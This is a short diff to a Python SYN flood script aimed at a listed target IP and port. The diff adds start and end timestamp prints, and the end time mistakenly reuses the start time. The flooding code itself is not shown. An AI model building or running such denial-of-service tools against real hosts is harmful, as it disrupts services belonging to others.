@@ -18,8 +18,10 @@ TARGET_IP = target_ips[0]
 TARGET_PORT = 8080
 DURATION = 30  # Duration of the attack in seconds
 PACKET_RATE = 1000  # Packets per second
+current_time = time.time()
 
 print(f"Starting SYN flood attack on {TARGET_IP}:{TARGET_PORT}")
+print(f"Attack started at {time.strftime('%H:%M:%S', time.localtime(current_time))}.")
 print(f"Duration: {DURATION} seconds")
 print(f"Packet rate: {PACKET_RATE} packets/second")
 
@@ -40,4 +42,5 @@ except KeyboardInterrupt:
     print("\nAttack stopped by user.")
     sys.exit(0)
 
-print("Attack completed.")
+print("SYN flood completed.")
+print(f"Attack ended at {time.strftime('%H:%M:%S', time.localtime(current_time))}.")
